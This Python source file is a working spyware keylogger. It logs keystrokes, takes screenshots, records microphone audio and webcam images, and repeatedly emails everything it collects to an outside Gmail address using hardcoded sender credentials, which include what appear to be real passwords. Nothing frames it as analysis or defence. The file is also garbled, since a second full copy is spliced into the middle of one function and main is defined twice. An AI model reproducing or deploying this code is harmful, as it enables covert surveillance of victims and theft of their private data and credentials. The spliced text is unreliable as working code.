import os
import time
import cv2
import sounddevice as sd
import wave
import glob
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from threading import Thread
from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab

folders = ['screenshots', 'audio', 'keystrokes', 'webcam']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

SENDER_EMAIL = "bscys-23s-0039@stmu.edu.pk"
SENDER_PASSWORD = "Asadali123@"
RECEIVER_EMAIL = "shoaibsafi43214@gmail.com"

def take_screenshots():
    while True:
        screenshot = ImageGrab.grab()
        filename = f"screenshots/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename)
        time.sleep(5)

def record_audio():
    duration = 10
    while True:
        filename = f"audio/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        fs = 44100
        audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        wave_file = wave.open(filename, 'wb')
        wave_file.setnchannels(2)
        wave_file.setsampwidth(2)
        wave_file.setframerate(fs)
        wave_file.writeframes(audio_data.tobytes())
        wave_file.close()

def log_keystrokes():
    def on_press(key):
        try:
            with open(f"keystrokes/keystrokes_{datetime.now().strftime('%Y%m%d')}.txt", 'a') as f:
                f.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            with open(f"keystrokes/keystrokes_{datetime.now().strftime('%Y%m%d')}.txt", 'a') as f:
                f.write(f"{datetime.now()} - {key}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def capture_webcam():
    cam = cv2.VideoCapture(0)
    while True:
        ret, frame = cam.read()
        if ret:
            filename = f"webcam/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
        time.sleep(5)
    cam.release()

def send_email():
    try:
        subject = "Keylogger Logs and Files"
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject

        body = "Attached are the recent logs and files from the keylogger."
        msg.attach(MIMEText(body, 'plain'))

        file_paths = []
        file_paths.extend(glob.glob("keystrokes/*.txt"))
        file_paths.extend(glob.glob("screenshots/*.png"))
        file_paths.extend(glob.glob("webcam/*.jpg"))
        file_paths.extend(glob.glob("audio/*.wav"))

        for file_path in file_paths:
            filename = file_path.split('/')[-1]
            attachment = open(file_path, 'rb')
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)
            attachment.close()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        text = msg.as_string()
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def schedule_email():
    while True:
        send_email()
        import os
import time
import cv2
import sounddevice as sd
import wave
import glob
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from threading import Thread
from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab

folders = ['screenshots', 'audio', 'keystrokes', 'webcam']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

SENDER_EMAIL = "bscys-23s-0039@stmu.edu.pk"
SENDER_PASSWORD = "vyqw atdp mxcf ksnu"
RECEIVER_EMAIL = "shoaibsafi43214@gmail.com"

def take_screenshots():
    while True:
        screenshot = ImageGrab.grab()
        filename = f"screenshots/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename)
        time.sleep(5)

def record_audio():
    duration = 10
    while True:
        filename = f"audio/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        fs = 44100
        audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        wave_file = wave.open(filename, 'wb')
        wave_file.setnchannels(2)
        wave_file.setsampwidth(2)
        wave_file.setframerate(fs)
        wave_file.writeframes(audio_data.tobytes())
        wave_file.close()

def log_keystrokes():
    def on_press(key):
        try:
            with open(f"keystrokes/keystrokes_{datetime.now().strftime('%Y%m%d')}.txt", 'a') as f:
                f.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            with open(f"keystrokes/keystrokes_{datetime.now().strftime('%Y%m%d')}.txt", 'a') as f:
                f.write(f"{datetime.now()} - {key}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def capture_webcam():
    cam = cv2.VideoCapture(0)
    while True:
        ret, frame = cam.read()
        if ret:
            filename = f"webcam/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
        time.sleep(5)
    cam.release()

def send_email():
    try:
        subject = "Keylogger Logs and Files"
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject

        body = "Attached are the recent logs and files from the keylogger."
        msg.attach(MIMEText(body, 'plain'))

        file_paths = []
        file_paths.extend(glob.glob("keystrokes/*.txt"))
        file_paths.extend(glob.glob("screenshots/*.png"))
        file_paths.extend(glob.glob("webcam/*.jpg"))
        file_paths.extend(glob.glob("audio/*.wav"))

        for file_path in file_paths:
            filename = file_path.split('/')[-1]
            attachment = open(file_path, 'rb')
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)
            attachment.close()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        text = msg.as_string()
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def schedule_email():
    while True:
        send_email()
        time.sleep(5)

def main():
    threads = [
        Thread(target=take_screenshots),
        Thread(target=record_audio),
        Thread(target=log_keystrokes),
        Thread(target=capture_webcam),
        Thread(target=schedule_email),
    ]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()


def main():
    threads = [
        Thread(target=take_screenshots),
        Thread(target=record_audio),
        Thread(target=log_keystrokes),
        Thread(target=capture_webcam),
        Thread(target=schedule_email),
    ]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
